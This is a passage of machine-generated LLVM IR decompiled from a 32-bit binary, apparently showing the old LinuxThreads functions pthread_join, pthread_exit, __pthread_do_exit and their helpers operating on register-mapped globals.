  %v1_8059751 = add i32 %v3_805974a, 8
  %v2_8059751 = inttoptr i32 %v1_8059751 to i32*
  %v3_8059751 = load i32, i32* %v2_8059751, align 4
  store i32 %v3_8059751, i32* %v2_805974a, align 4
  store i32 0, i32* %v2_8059751, align 4
  %v0_8059761.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805975e

dec_label_pc_805975e:                             ; preds = %entry, %dec_label_pc_8059751
  %v0_8059761 = phi i32 [ %v0_805974a, %entry ], [ %v0_8059761.pre, %dec_label_pc_8059751 ]
  %v1_8059762 = inttoptr i32 %v0_8059761 to i32*
  %v2_8059762 = call i32 @__pthread_unlock(i32* %v1_8059762)
  br i1 %v1_805974d, label %dec_label_pc_805977c, label %dec_label_pc_805976e

dec_label_pc_805976e:                             ; preds = %dec_label_pc_805975e
  %v1_805976e = add i32 %v3_805974a, 441
  %v2_805976e = inttoptr i32 %v1_805976e to i8*
  store i8 1, i8* %v2_805976e, align 1
  store i32 %v3_805974a, i32* @eax, align 4
  %v0_8059777 = call i32 @restart.12()
  br label %dec_label_pc_805977c

dec_label_pc_805977c:                             ; preds = %dec_label_pc_805975e, %dec_label_pc_805976e
  ret i32 0

; uselistorder directives
  uselistorder i1 %v1_805974d, { 1, 0 }
  uselistorder i32 %v3_805974a, { 1, 2, 0, 3, 4 }
  uselistorder i32 ()* @restart.12, { 3, 0, 2, 1 }
  uselistorder i32 441, { 0, 3, 1, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805977c, { 1, 0 }
  uselistorder label %dec_label_pc_805975e, { 1, 0 }
}

define i32 @__linuxthreads_create_event() local_unnamed_addr {
entry:
  %v0_8059784 = load i32, i32* @eax, align 4
  ret i32 %v0_8059784
}

define i32 @__linuxthreads_death_event() local_unnamed_addr {
entry:
  %v0_8059785 = load i32, i32* @eax, align 4
  ret i32 %v0_8059785
}

define i32 @__linuxthreads_reap_event() local_unnamed_addr {
entry:
  %v0_8059786 = load i32, i32* @eax, align 4
  ret i32 %v0_8059786
}

define i32 @__pthread_set_own_extricate_if.15() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_8059788 = load i32, i32* @esi, align 4
  %v0_8059789 = load i32, i32* @ebx, align 4
  %v0_805978d = load i32, i32* @eax, align 4
  store i32 %v0_805978d, i32* @ebx, align 4
  %v0_805978f = load i32, i32* @edx, align 4
  store i32 %v0_805978f, i32* @esi, align 4
  %v1_8059791 = icmp eq i32 %v0_805978f, 0
  br i1 %v1_8059791, label %dec_label_pc_805979d, label %dec_label_pc_8059795

dec_label_pc_8059795:                             ; preds = %entry
  %v1_8059795 = add i32 %v0_805978d, 64
  %v2_8059795 = inttoptr i32 %v1_8059795 to i8*
  %v3_8059795 = load i8, i8* %v2_8059795, align 1
  %v4_8059795 = icmp eq i8 %v3_8059795, 0
  %v1_8059799 = icmp eq i1 %v4_8059795, false
  br i1 %v1_8059799, label %dec_label_pc_80597bf, label %dec_label_pc_80597a7

dec_label_pc_805979d:                             ; preds = %entry
  %v1_805979d = add i32 %v0_805978d, 28
  %v2_805979d = inttoptr i32 %v1_805979d to i32*
  %v3_805979d = load i32, i32* %v2_805979d, align 4
  store i32 %v3_805979d, i32* @eax, align 4
  store i32 %v0_805978d, i32* @edx, align 4
  %v1_80597a2 = call i32 @__pthread_lock(i32 %v0_8059789)
  %v1_80597a7.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80597a7

dec_label_pc_80597a7:                             ; preds = %dec_label_pc_8059795, %dec_label_pc_805979d
  %v1_80597a7 = phi i32 [ %v0_805978d, %dec_label_pc_8059795 ], [ %v1_80597a7.pre, %dec_label_pc_805979d ]
  %v2_80597a7 = add i32 %v1_80597a7, 444
  %v3_80597a7 = inttoptr i32 %v2_80597a7 to i32*
  store i32 %v0_805978f, i32* %v3_80597a7, align 4
  %v1_80597af = icmp eq i1 %v1_8059791, false
  br i1 %v1_80597af, label %dec_label_pc_80597bf, label %dec_label_pc_80597b1

dec_label_pc_80597b1:                             ; preds = %dec_label_pc_80597a7
  %v0_80597b4 = load i32, i32* @ebx, align 4
  %v1_80597b4 = add i32 %v0_80597b4, 28
  %v2_80597b4 = inttoptr i32 %v1_80597b4 to i32*
  %v3_80597b4 = load i32, i32* %v2_80597b4, align 4
  %v1_80597b7 = inttoptr i32 %v3_80597b4 to i32*
  %v2_80597b7 = call i32 @__pthread_unlock(i32* %v1_80597b7)
  br label %dec_label_pc_80597bf

dec_label_pc_80597bf:                             ; preds = %dec_label_pc_80597a7, %dec_label_pc_8059795, %dec_label_pc_80597b1
  %v2_80597bf = load i32, i32* %stack_var_-12, align 4
  store i32 %v0_8059789, i32* @ebx, align 4
  store i32 %v0_8059788, i32* @esi, align 4
  ret i32 %v2_80597bf

; uselistorder directives
  uselistorder i1 %v1_8059791, { 1, 0 }
  uselistorder i32 444, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_80597bf, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80597a7, { 1, 0 }
}

define i32 @thread_self.16(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_2096672 = alloca i32, align 4
  %v0_80597ca = load i32, i32* @esp, align 4
  %v1_80597ca = load i32, i32* @global_var_8078e6c.615, align 4
  %v7_80597ca = icmp ult i32 %v0_80597ca, %v1_80597ca
  %v1_80597d0 = icmp eq i1 %v7_80597ca, false
  br i1 %v1_80597d0, label %dec_label_pc_8059801, label %dec_label_pc_80597d2

dec_label_pc_80597d2:                             ; preds = %entry
  %v1_80597d2 = load i32, i32* @global_var_8078e70.616, align 16
  %v7_80597d2 = icmp ult i32 %v0_80597ca, %v1_80597d2
  br i1 %v7_80597d2, label %dec_label_pc_80597e7, label %dec_label_pc_80597da

dec_label_pc_80597da:                             ; preds = %dec_label_pc_80597d2
  %v1_80597df = load i32, i32* @global_var_8078e74.618, align 4
  %v7_80597df = icmp ult i32 %v0_80597ca, %v1_80597df
  br i1 %v7_80597df, label %dec_label_pc_8059801, label %dec_label_pc_80597e7

dec_label_pc_80597e7:                             ; preds = %dec_label_pc_80597da, %dec_label_pc_80597d2
  %v0_80597e7 = load i32, i32* @global_var_807e578.619, align 8
  %v1_80597e7 = icmp eq i32 %v0_80597e7, 0
  br i1 %v1_80597e7, label %dec_label_pc_80597f5, label %dec_label_pc_80597f0

dec_label_pc_80597f0:                             ; preds = %dec_label_pc_80597e7
  %v0_80597f0 = call i32 @__pthread_find_self()
  br label %dec_label_pc_80597f5

dec_label_pc_80597f5:                             ; preds = %dec_label_pc_80597e7, %dec_label_pc_80597f0
  %v2_80597fb = ptrtoint i32* %stack_var_2096672 to i32
  br label %dec_label_pc_8059801

dec_label_pc_8059801:                             ; preds = %dec_label_pc_80597da, %entry, %dec_label_pc_80597f5
  %v0_8059801 = phi i32 [ ptrtoint (i32* @global_var_8074340.617 to i32), %dec_label_pc_80597da ], [ ptrtoint (i32* @global_var_8074160 to i32), %entry ], [ %v2_80597fb, %dec_label_pc_80597f5 ]
  ret i32 %v0_8059801

; uselistorder directives
  uselistorder label %dec_label_pc_8059801, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80597f5, { 1, 0 }
}

define i32 @join_extricate_func(i32 %arg1) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %v0_8059802 = load i32, i32* @esi, align 4
  %v0_8059803 = load i32, i32* @ebx, align 4
  %v2_8059807 = call i32 @thread_self.16(i32 %v0_8059803, i32 %v0_8059802)
  store i32 %arg1, i32* @ebx, align 4
  store i32 %v2_8059807, i32* @edx, align 4
  store i32 %arg1, i32* @eax, align 4
  %v1_805981a = call i32 @__pthread_lock(i32 %v2_8059807)
  %v0_805981f = load i32, i32* @ebx, align 4
  %v1_805981f = add i32 %v0_805981f, 8
  %v2_805981f = inttoptr i32 %v1_805981f to i32*
  %v3_805981f = load i32, i32* %v2_805981f, align 4
  %v1_8059822 = add i32 %v3_805981f, 56
  %v2_8059822 = inttoptr i32 %v1_8059822 to i32*
  %v3_8059822 = load i32, i32* %v2_8059822, align 4
  %v4_8059822 = icmp eq i32 %v3_8059822, 0
  %v1_8059826 = icmp eq i1 %v4_8059822, false
  %v2_8059826 = zext i1 %v1_8059826 to i32
  %v3_8059826 = load i32, i32* @edx, align 4
  %v4_8059826 = and i32 %v3_8059826, -256
  %v5_8059826 = or i32 %v2_8059826, %v4_8059826
  store i32 %v5_8059826, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v2_8059822, align 4
  %v0_8059833 = load i32, i32* %edx.global-to-local, align 4
  %v1_8059833 = urem i32 %v0_8059833, 256
  store i32 %v1_8059833, i32* @esi, align 4
  %v0_8059836 = load i32, i32* @ebx, align 4
  %v1_8059837 = inttoptr i32 %v0_8059836 to i32*
  %v2_8059837 = call i32 @__pthread_unlock(i32* %v1_8059837)
  %v0_805983c = load i32, i32* @esi, align 4
  ret i32 %v0_805983c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @suspend.17() local_unnamed_addr {
entry:
  %v0_8059847 = load i32, i32* @eax, align 4
  %v1_8059848 = call i32 @__pthread_wait_for_restart_signal(i32 %v0_8059847)
  ret i32 %v1_8059848

; uselistorder directives
  uselistorder i32 (i32)* @__pthread_wait_for_restart_signal, { 1, 2, 3, 4, 0, 5, 6 }
}

define i32 @__pthread_do_exit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-188 = alloca i32, align 4
  %v0_8059851 = load i32, i32* @esi, align 4
  %v0_8059852 = load i32, i32* @ebx, align 4
  %v2_8059859 = call i32 @thread_self.16(i32 %v0_8059852, i32 %v0_8059851)
  store i32 %v2_8059859, i32* @ebx, align 4
  %v1_8059863 = add i32 %v2_8059859, 64
  %v2_8059863 = inttoptr i32 %v1_8059863 to i8*
  store i8 1, i8* %v2_8059863, align 1
  %v1_8059867 = add i32 %v2_8059859, 65
  %v2_8059867 = inttoptr i32 %v1_8059867 to i8*
  store i8 0, i8* %v2_8059867, align 1
  store i32 %arg2, i32* %stack_var_-188, align 4
  %v1_8059872 = call i32 @__pthread_perform_cleanup(i32 %arg2)
  %v0_8059877 = call i32 @__pthread_destroy_specifics()
  %v0_805987c = load i32, i32* @ebx, align 4
  %v1_805987c = add i32 %v0_805987c, 28
  %v2_805987c = inttoptr i32 %v1_805987c to i32*
  %v3_805987c = load i32, i32* %v2_805987c, align 4
  store i32 %v3_805987c, i32* @eax, align 4
  store i32 %v0_805987c, i32* @edx, align 4
  %v0_8059881 = load i32, i32* %stack_var_-188, align 4
  %v1_8059881 = call i32 @__pthread_lock(i32 %v0_8059881)
  %v1_805988d = load i32, i32* @ebx, align 4
  %v2_805988d = add i32 %v1_805988d, 48
  %v3_805988d = inttoptr i32 %v2_805988d to i32*
  store i32 %arg1, i32* %v3_805988d, align 4
  %v0_8059893 = load i32, i32* @ebx, align 4
  %v1_8059893 = add i32 %v0_8059893, 412
  %v2_8059893 = inttoptr i32 %v1_8059893 to i32*
  %v3_8059893 = load i32, i32* %v2_8059893, align 4
  %v4_8059893 = icmp eq i32 %v3_8059893, 0
  br i1 %v4_8059893, label %dec_label_pc_80598c7, label %dec_label_pc_805989c

dec_label_pc_805989c:                             ; preds = %entry
  %v0_805989c = load i32, i32* @global_var_807e57c.630, align 4
  %v2_80598a1 = add i32 %v0_8059893, 416
  %v3_80598a1 = inttoptr i32 %v2_80598a1 to i32*
  %v4_80598a1 = load i32, i32* %v3_80598a1, align 4
  %v5_80598a1 = or i32 %v4_80598a1, %v0_805989c
  store i32 %v5_80598a1, i32* @eax, align 4
  %v3_80598a7 = and i32 %v5_80598a1, 256
  %v4_80598a7 = icmp eq i32 %v3_80598a7, 0
  br i1 %v4_80598a7, label %dec_label_pc_80598c7, label %dec_label_pc_80598ac

dec_label_pc_80598ac:                             ; preds = %dec_label_pc_805989c
  %v1_80598ac = add i32 %v0_8059893, 424
  %v2_80598ac = inttoptr i32 %v1_80598ac to i32*
  store i32 9, i32* %v2_80598ac, align 4
  %v0_80598b6 = load i32, i32* @ebx, align 4
  %v2_80598b6 = add i32 %v0_80598b6, 428
  %v3_80598b6 = inttoptr i32 %v2_80598b6 to i32*
  store i32 %v0_80598b6, i32* %v3_80598b6, align 4
  %v0_80598bc = load i32, i32* @ebx, align 4
  store i32 %v0_80598bc, i32* @global_var_807e584.631, align 4
  %v0_80598c2 = call i32 @__linuxthreads_death_event()
  %v0_80598ca.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80598c7

dec_label_pc_80598c7:                             ; preds = %dec_label_pc_805989c, %entry, %dec_label_pc_80598ac
  %v0_80598ca = phi i32 [ %v0_8059893, %dec_label_pc_805989c ], [ %v0_8059893, %entry ], [ %v0_80598ca.pre, %dec_label_pc_80598ac ]
  %v1_80598ca = add i32 %v0_80598ca, 56
  %v2_80598ca = inttoptr i32 %v1_80598ca to i32*
  %v3_80598ca = load i32, i32* %v2_80598ca, align 4
  %v1_80598cd = add i32 %v0_80598ca, 44
  %v2_80598cd = inttoptr i32 %v1_80598cd to i8*
  store i8 1, i8* %v2_80598cd, align 1
  %v0_80598d1 = load i32, i32* @ebx, align 4
  %v1_80598d1 = add i32 %v0_80598d1, 28
  %v2_80598d1 = inttoptr i32 %v1_80598d1 to i32*
  %v3_80598d1 = load i32, i32* %v2_80598d1, align 4
  store i32 %v3_80598d1, i32* %stack_var_-188, align 4
  %v1_80598d4 = inttoptr i32 %v3_80598d1 to i32*
  %v2_80598d4 = call i32 @__pthread_unlock(i32* %v1_80598d4)
  %v1_80598dc = icmp eq i32 %v3_80598ca, 0
  br i1 %v1_80598dc, label %dec_label_pc_80598ec, label %dec_label_pc_80598e0

dec_label_pc_80598e0:                             ; preds = %dec_label_pc_80598c7
  store i32 %v3_80598ca, i32* %stack_var_-188, align 4
  %v1_80598e4 = call i32 @__pthread_restart_new(i32 %v3_80598ca)
  br label %dec_label_pc_80598ec

dec_label_pc_80598ec:                             ; preds = %dec_label_pc_80598c7, %dec_label_pc_80598e0
  %v0_80598ec = load i32, i32* bitcast (i32** @global_var_8074520.625 to i32*), align 32
  store i32 %v0_80598ec, i32* @esi, align 4
  %v0_80598f2 = load i32, i32* @ebx, align 4
  %v12_80598f2 = icmp eq i32 %v0_80598f2, %v0_80598ec
  %v1_80598f4 = icmp eq i1 %v12_80598f2, false
  br i1 %v1_80598f4, label %dec_label_pc_8059942, label %dec_label_pc_80598f6

dec_label_pc_80598f6:                             ; preds = %dec_label_pc_80598ec
  %v0_80598f6 = load i32, i32* @global_var_8074524.624, align 4
  %v2_80598f6 = icmp slt i32 %v0_80598f6, 0
  br i1 %v2_80598f6, label %dec_label_pc_8059942, label %dec_label_pc_80598ff

dec_label_pc_80598ff:                             ; preds = %dec_label_pc_80598f6
  store i32 %v0_80598ec, i32* %stack_var_-156, align 4
  %v2_805990b = ptrtoint i32* %stack_var_-156 to i32
  br label %dec_label_pc_805990b

dec_label_pc_805990b:                             ; preds = %dec_label_pc_8059927.dec_label_pc_805990b_crit_edge, %dec_label_pc_80598ff
  %v0_8059916 = phi i32 [ %v0_8059916.pre, %dec_label_pc_8059927.dec_label_pc_805990b_crit_edge ], [ %v0_80598f6, %dec_label_pc_80598ff ]
  store i32 %v0_8059916, i32* %stack_var_-188, align 4
  %v3_805991c = call i32 @__libc_write(i32 %v0_8059916, i32 %v2_805990b, i32 148)
  %v8_8059924 = icmp eq i32 %v3_805991c, -1
  %v1_8059925 = icmp eq i1 %v8_8059924, false
  br i1 %v1_8059925, label %dec_label_pc_8059931, label %dec_label_pc_8059927

dec_label_pc_8059927:                             ; preds = %dec_label_pc_805990b
  %v0_8059927 = load i32, i32* %stack_var_-188, align 4
  %v1_8059927 = call i32 @__errno_location(i32 %v0_8059927)
  %v1_805992c = inttoptr i32 %v1_8059927 to i32*
  %v2_805992c = load i32, i32* %v1_805992c, align 4
  %v11_805992c = icmp eq i32 %v2_805992c, 4
  br i1 %v11_805992c, label %dec_label_pc_8059927.dec_label_pc_805990b_crit_edge, label %dec_label_pc_8059931

dec_label_pc_8059927.dec_label_pc_805990b_crit_edge: ; preds = %dec_label_pc_8059927
  %v0_8059916.pre = load i32, i32* @global_var_8074524.624, align 4
  br label %dec_label_pc_805990b

dec_label_pc_8059931:                             ; preds = %dec_label_pc_8059927, %dec_label_pc_805990b
  %v0_8059931 = load i32, i32* @esi, align 4
  store i32 %v0_8059931, i32* @eax, align 4
  %v0_8059933 = call i32 @suspend.17()
  store i32 0, i32* %stack_var_-188, align 4
  %v1_805993d = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8059942

dec_label_pc_8059942:                             ; preds = %dec_label_pc_80598f6, %dec_label_pc_80598ec, %dec_label_pc_8059931
  store i32 0, i32* %stack_var_-188, align 4
  %v1_8059947 = call i32 @__GI__exit(i32 0)
  unreachable

; uselistorder directives
  uselistorder i32 %v0_8059916, { 1, 0 }
  uselistorder i32 %v0_80598ec, { 1, 0, 2 }
  uselistorder i32 %v3_80598ca, { 2, 1, 0 }
  uselistorder i32 %v0_80598ca, { 1, 0 }
  uselistorder i32 %v0_80598b6, { 1, 0 }
  uselistorder i32 %v2_8059859, { 0, 2, 1 }
  uselistorder i32* %stack_var_-188, { 2, 3, 1, 4, 5, 6, 0, 7 }
  uselistorder i32* %stack_var_-156, { 1, 0 }
  uselistorder i32 (i32)* @__pthread_restart_new, { 1, 2, 5, 0, 4, 3 }
  uselistorder i32 428, { 2, 0, 1 }
  uselistorder i32 424, { 2, 0, 1 }
  uselistorder i32 416, { 2, 0, 1 }
  uselistorder i32 412, { 2, 0, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8059942, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80598ec, { 1, 0 }
  uselistorder label %dec_label_pc_80598c7, { 2, 0, 1 }
}

define i32 @pthread_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v2_805994f = ptrtoint i32* %stack_var_0 to i32
  %v2_8059958 = call i32 @__pthread_do_exit(i32 %arg1, i32 %v2_805994f)
  ret i32 %v2_8059958
}

define i32 @pthread_join(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-204 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_805995e = load i32, i32* @edi, align 4
  %v0_805995f = load i32, i32* @esi, align 4
  %v0_8059960 = load i32, i32* @ebx, align 4
  store i32 %v0_8059960, i32* %stack_var_-16, align 4
  %v4_8059960 = ptrtoint i32* %stack_var_-16 to i32
  %v2_8059967 = call i32 @thread_self.16(i32 %v0_8059960, i32 %v0_805995f)
  store i32 %arg1, i32* @ebp, align 4
  store i32 %v2_8059967, i32* @edx, align 4
  %v1_8059983 = urem i32 %arg1, 1024
  %v2_8059993 = mul nuw nsw i32 %v1_8059983, 16
  %v1_8059996 = add i32 %v2_8059993, ptrtoint (i32* @global_var_8070140.628 to i32)
  store i32 %v1_8059996, i32* @esi, align 4
  store i32 %v1_8059996, i32* @eax, align 4
  store i32 %v1_8059996, i32* %stack_var_-28, align 4
  %v1_80599a5 = call i32 @__pthread_lock(i32 %v1_8059996)
  %v0_80599aa = load i32, i32* @esi, align 4
  %v1_80599aa = add i32 %v0_80599aa, 8
  %v2_80599aa = inttoptr i32 %v1_80599aa to i32*
  %v3_80599aa = load i32, i32* %v2_80599aa, align 4
  store i32 %v3_80599aa, i32* @ebx, align 4
  %v1_80599ad = icmp eq i32 %v3_80599aa, 0
  br i1 %v1_80599ad, label %dec_label_pc_80599b6, label %dec_label_pc_80599b1

dec_label_pc_80599b1:                             ; preds = %entry
  %v1_80599b1 = add i32 %v3_80599aa, 16
  %v2_80599b1 = inttoptr i32 %v1_80599b1 to i32*
  %v3_80599b1 = load i32, i32* %v2_80599b1, align 4
  %v4_80599b1 = load i32, i32* @ebp, align 4
  %v15_80599b1 = icmp eq i32 %v3_80599b1, %v4_80599b1
  br i1 %v15_80599b1, label %dec_label_pc_80599c6, label %dec_label_pc_80599b6

dec_label_pc_80599b6:                             ; preds = %dec_label_pc_80599b1, %entry
  store i32 %v0_80599aa, i32* %stack_var_-204, align 4
  %v1_80599ba = inttoptr i32 %v0_80599aa to i32*
  %v2_80599ba = call i32 @__pthread_unlock(i32* %v1_80599ba)
  br label %dec_label_pc_80599df

dec_label_pc_80599c6:                             ; preds = %dec_label_pc_80599b1
  %v12_80599cd = icmp eq i32 %v3_80599aa, %v2_8059967
  %v1_80599cf = icmp eq i1 %v12_80599cd, false
  br i1 %v1_80599cf, label %dec_label_pc_80599e7, label %dec_label_pc_80599d1

dec_label_pc_80599d1:                             ; preds = %dec_label_pc_80599c6
  store i32 %v0_80599aa, i32* %stack_var_-204, align 4
  %v1_80599d5 = inttoptr i32 %v0_80599aa to i32*
  %v2_80599d5 = call i32 @__pthread_unlock(i32* %v1_80599d5)
  br label %dec_label_pc_80599df

dec_label_pc_80599df:                             ; preds = %dec_label_pc_80599f3, %dec_label_pc_80599b6, %dec_label_pc_80599d1
  %v0_8059b434 = phi i32 [ 22, %dec_label_pc_80599f3 ], [ 3, %dec_label_pc_80599b6 ], [ 35, %dec_label_pc_80599d1 ]
  br label %dec_label_pc_8059b39

dec_label_pc_80599e7:                             ; preds = %dec_label_pc_80599c6
  %v1_80599e7 = add i32 %v3_80599aa, 45
  %v2_80599e7 = inttoptr i32 %v1_80599e7 to i8*
  %v3_80599e7 = load i8, i8* %v2_80599e7, align 1
  %v4_80599e7 = icmp eq i8 %v3_80599e7, 0
  %v1_80599eb = icmp eq i1 %v4_80599e7, false
  br i1 %v1_80599eb, label %dec_label_pc_80599f3, label %dec_label_pc_80599ed

dec_label_pc_80599ed:                             ; preds = %dec_label_pc_80599e7
  %v1_80599ed = add i32 %v3_80599aa, 56
  %v2_80599ed = inttoptr i32 %v1_80599ed to i32*
  %v3_80599ed = load i32, i32* %v2_80599ed, align 4
  %v4_80599ed = icmp eq i32 %v3_80599ed, 0
  br i1 %v4_80599ed, label %dec_label_pc_8059a03, label %dec_label_pc_80599f3

dec_label_pc_80599f3:                             ; preds = %dec_label_pc_80599ed, %dec_label_pc_80599e7
  store i32 %v0_80599aa, i32* %stack_var_-204, align 4
  %v1_80599f7 = inttoptr i32 %v0_80599aa to i32*
  %v2_80599f7 = call i32 @__pthread_unlock(i32* %v1_80599f7)
  br label %dec_label_pc_80599df

dec_label_pc_8059a03:                             ; preds = %dec_label_pc_80599ed
  %v1_8059a03 = add i32 %v3_80599aa, 44
  %v2_8059a03 = inttoptr i32 %v1_8059a03 to i8*
  %v3_8059a03 = load i8, i8* %v2_8059a03, align 1
  %v4_8059a03 = icmp eq i8 %v3_8059a03, 0
  %v1_8059a07 = icmp eq i1 %v4_8059a03, false
  br i1 %v1_8059a07, label %dec_label_pc_8059acf, label %dec_label_pc_8059a0d

dec_label_pc_8059a0d:                             ; preds = %dec_label_pc_8059a03
  store i32 %v2_8059967, i32* @eax, align 4
  %v2_8059a14 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8059a14, i32* @edx, align 4
  %v0_8059a1b = call i32 @__pthread_set_own_extricate_if.15()
  %v1_8059a27 = add i32 %v2_8059967, 66
  %v2_8059a27 = inttoptr i32 %v1_8059a27 to i8*
  %v3_8059a27 = load i8, i8* %v2_8059a27, align 1
  %v4_8059a27 = icmp eq i8 %v3_8059a27, 0
  br i1 %v4_8059a27, label %dec_label_pc_8059a3f, label %dec_label_pc_8059a2d

dec_label_pc_8059a2d:                             ; preds = %dec_label_pc_8059a0d
  store i32 1, i32* @edi, align 4
  %v1_8059a39 = add i32 %v2_8059967, 64
  %v2_8059a39 = inttoptr i32 %v1_8059a39 to i8*
  %v3_8059a39 = load i8, i8* %v2_8059a39, align 1
  %v4_8059a39 = icmp eq i8 %v3_8059a39, 0
  br i1 %v4_8059a39, label %dec_label_pc_8059a4b, label %dec_label_pc_8059a3f

dec_label_pc_8059a3f:                             ; preds = %dec_label_pc_8059a2d, %dec_label_pc_8059a0d
  store i32 0, i32* @edi, align 4
  store i32 %v2_8059967, i32* %v2_80599ed, align 4
  br label %dec_label_pc_8059a4b

dec_label_pc_8059a4b:                             ; preds = %dec_label_pc_8059a2d, %dec_label_pc_8059a3f
  %v0_8059a4e = load i32, i32* @esi, align 4
  store i32 %v0_8059a4e, i32* %stack_var_-204, align 4
  %v1_8059a4f = inttoptr i32 %v0_8059a4e to i32*
  %v2_8059a4f = call i32 @__pthread_unlock(i32* %v1_8059a4f)
  %v0_8059a57 = load i32, i32* @edi, align 4
  %v1_8059a57 = icmp eq i32 %v0_8059a57, 0
  store i32 %v2_8059967, i32* @eax, align 4
  br i1 %v1_8059a57, label %dec_label_pc_8059a6b, label %dec_label_pc_8059a5b

dec_label_pc_8059a5b:                             ; preds = %dec_label_pc_8059a4b
  store i32 0, i32* @edx, align 4
  %v0_8059a64 = call i32 @__pthread_set_own_extricate_if.15()
  br label %dec_label_pc_8059ab0

dec_label_pc_8059a6b:                             ; preds = %dec_label_pc_8059a4b
  %v0_8059a72 = call i32 @suspend.17()
  store i32 %v2_8059967, i32* @eax, align 4
  store i32 0, i32* @edx, align 4
  %v0_8059a80 = call i32 @__pthread_set_own_extricate_if.15()
  %v1_8059a8c = add i32 %v2_8059967, 440
  %v2_8059a8c = inttoptr i32 %v1_8059a8c to i8*
  %v3_8059a8c = load i8, i8* %v2_8059a8c, align 1
  %v4_8059a8c = icmp eq i8 %v3_8059a8c, 0
  br i1 %v4_8059a8c, label %dec_label_pc_8059ac1, label %dec_label_pc_8059a95

dec_label_pc_8059a95:                             ; preds = %dec_label_pc_8059a6b
  %v1_8059a9c = add i32 %v2_8059967, 64
  %v2_8059a9c = inttoptr i32 %v1_8059a9c to i8*
  %v3_8059a9c = load i8, i8* %v2_8059a9c, align 1
  %v4_8059a9c = icmp eq i8 %v3_8059a9c, 0
  %v1_8059aa0 = icmp eq i1 %v4_8059a9c, false
  br i1 %v1_8059aa0, label %dec_label_pc_8059ac1, label %dec_label_pc_8059aa2

dec_label_pc_8059aa2:                             ; preds = %dec_label_pc_8059a95
  store i8 0, i8* %v2_8059a8c, align 1
  br label %dec_label_pc_8059ab0

dec_label_pc_8059ab0:                             ; preds = %dec_label_pc_8059a5b, %dec_label_pc_8059aa2
  store i32 -1, i32* %stack_var_-204, align 4
  %v2_8059abc = call i32 @__pthread_do_exit(i32 -1, i32 %v4_8059960)
  br label %dec_label_pc_8059ac1

dec_label_pc_8059ac1:                             ; preds = %dec_label_pc_8059a95, %dec_label_pc_8059a6b, %dec_label_pc_8059ab0
  store i32 %v2_8059967, i32* @edx, align 4
  %v0_8059ac8 = load i32, i32* @esi, align 4
  store i32 %v0_8059ac8, i32* @eax, align 4
  %v0_8059aca = load i32, i32* %stack_var_-204, align 4
  %v1_8059aca = call i32 @__pthread_lock(i32 %v0_8059aca)
  br label %dec_label_pc_8059acf

dec_label_pc_8059acf:                             ; preds = %dec_label_pc_8059a03, %dec_label_pc_8059ac1
  %v4_8059acf = icmp eq i32 %arg2, 0
  br i1 %v4_8059acf, label %dec_label_pc_8059ae5, label %dec_label_pc_8059ad9

dec_label_pc_8059ad9:                             ; preds = %dec_label_pc_8059acf
  %v1_8059ae0 = add i32 %v3_80599aa, 48
  %v2_8059ae0 = inttoptr i32 %v1_8059ae0 to i32*
  %v3_8059ae0 = load i32, i32* %v2_8059ae0, align 4
  %v2_8059ae3 = inttoptr i32 %v0_805995e to i32*
  store i32 %v3_8059ae0, i32* %v2_8059ae3, align 4
  br label %dec_label_pc_8059ae5

dec_label_pc_8059ae5:                             ; preds = %dec_label_pc_8059acf, %dec_label_pc_8059ad9
  %v0_8059ae8 = load i32, i32* @esi, align 4
  store i32 %v0_8059ae8, i32* %stack_var_-204, align 4
  %v1_8059ae9 = inttoptr i32 %v0_8059ae8 to i32*
  %v2_8059ae9 = call i32 @__pthread_unlock(i32* %v1_8059ae9)
  %v0_8059af1 = load i32, i32* @global_var_8074524.624, align 4
  %v2_8059af1 = icmp slt i32 %v0_8059af1, 0
  br i1 %v2_8059af1, label %dec_label_pc_8059b37, label %dec_label_pc_8059afa

dec_label_pc_8059afa:                             ; preds = %dec_label_pc_8059ae5
  store i32 %v2_8059967, i32* %stack_var_-176, align 4
  %v2_8059b11 = ptrtoint i32* %stack_var_-176 to i32
  br label %dec_label_pc_8059b11

dec_label_pc_8059b11:                             ; preds = %dec_label_pc_8059b2d.dec_label_pc_8059b11_crit_edge, %dec_label_pc_8059afa
  %v0_8059b1c = phi i32 [ %v0_8059b1c.pre, %dec_label_pc_8059b2d.dec_label_pc_8059b11_crit_edge ], [ %v0_8059af1, %dec_label_pc_8059afa ]
  store i32 %v0_8059b1c, i32* %stack_var_-204, align 4
  %v3_8059b22 = call i32 @__libc_write(i32 %v0_8059b1c, i32 %v2_8059b11, i32 148)
  %v8_8059b2a = icmp eq i32 %v3_8059b22, -1
  %v1_8059b2b = icmp eq i1 %v8_8059b2a, false
  br i1 %v1_8059b2b, label %dec_label_pc_8059b37, label %dec_label_pc_8059b2d

dec_label_pc_8059b2d:                             ; preds = %dec_label_pc_8059b11
  %v0_8059b2d = load i32, i32* %stack_var_-204, align 4
  %v1_8059b2d = call i32 @__errno_location(i32 %v0_8059b2d)
  %v1_8059b32 = inttoptr i32 %v1_8059b2d to i32*
  %v2_8059b32 = load i32, i32* %v1_8059b32, align 4
  %v11_8059b32 = icmp eq i32 %v2_8059b32, 4
